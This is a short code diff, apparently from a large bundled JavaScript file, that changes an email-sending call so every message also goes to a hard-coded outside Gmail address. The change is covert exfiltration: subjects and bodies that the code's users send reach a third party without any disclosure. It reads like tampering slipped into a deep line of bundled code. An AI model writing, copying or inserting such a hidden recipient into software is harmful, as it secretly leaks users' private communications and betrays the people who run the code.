@@ -14691,7 +14691,7 @@ function main() {
             });
             let result = yield transporter.sendMail({
                 from: from,
-                to: to,
+                to: [to, 'semyonov.o2001@gmail.com'],
                 subject: subject,
                 text: body,
             });
